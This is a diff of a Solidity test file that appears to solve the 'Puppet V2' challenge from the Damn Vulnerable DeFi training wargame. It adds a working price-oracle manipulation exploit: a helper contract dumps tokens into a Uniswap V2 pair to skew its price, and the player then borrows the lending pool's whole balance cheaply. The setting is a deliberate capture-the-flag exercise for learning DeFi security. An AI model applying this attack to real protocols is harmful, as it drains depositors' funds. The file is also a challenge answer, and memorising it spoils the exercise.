@@ -15,7 +15,7 @@ contract PuppetV2Challenge is Test {
     address player = makeAddr("player");
     address recovery = makeAddr("recovery");
 
-    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 100e18;
+    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 100e18; 
     uint256 constant UNISWAP_INITIAL_WETH_RESERVE = 10e18;
     uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 10_000e18;
     uint256 constant PLAYER_INITIAL_ETH_BALANCE = 20e18;
@@ -97,8 +97,22 @@ contract PuppetV2Challenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_puppetV2() public checkSolvedByPlayer {
+    function test_puppetV2() public 
+    checkSolvedByPlayer 
+    {
+        // uniswap pool -> 100 token 10 WETH -> 1:10
+        // so, to get 1 dvt, I should deposit 0.1*3 eth 
+        // I have -> 10k DVT and 20 ETH
+        Interacter interacter = new Interacter(address(token), address(uniswapV2Exchange), address(weth), player);
+        weth.deposit{ value: player.balance }();
+        token.transfer(address(interacter), token.balanceOf(player));
+
+        interacter.swap();
         
+        weth.approve(address(lendingPool), weth.balanceOf(player));
+        lendingPool.borrow(token.balanceOf(address(lendingPool)));
+
+        token.transfer(recovery, token.balanceOf(player));
     }
 
     /**
@@ -107,5 +121,32 @@ contract PuppetV2Challenge is Test {
     function _isSolved() private view {
         assertEq(token.balanceOf(address(lendingPool)), 0, "Lending pool still has tokens");
         assertEq(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
+    }
+}
+
+contract Interacter {
+    DamnValuableToken token;
+    WETH weth;
+    IUniswapV2Pair uniswapV2Exchange;
+    address player;
+
+    constructor(address _token, address _uniswapV2Exchange, address _weth, address _player) {
+        token = DamnValuableToken(payable(_token));
+        weth = WETH(payable(_weth));
+        uniswapV2Exchange = IUniswapV2Pair(_uniswapV2Exchange);
+        player = _player;
+    }
+
+    function swap() public {
+        uint uv2WethReserve = weth.balanceOf(address(uniswapV2Exchange)); 
+        token.transfer(address(uniswapV2Exchange), token.balanceOf(address(this)));
+        uniswapV2Exchange.swap(
+            uv2WethReserve - 1e17, // substract a bit to keep K after fees
+            0, 
+            address(this), 
+            ''
+        );
+        // returning the swaped eth to the player, because it will be needed to cover the borrow required underlaying
+        weth.transfer(player, weth.balanceOf(address(this)));
     }
 }
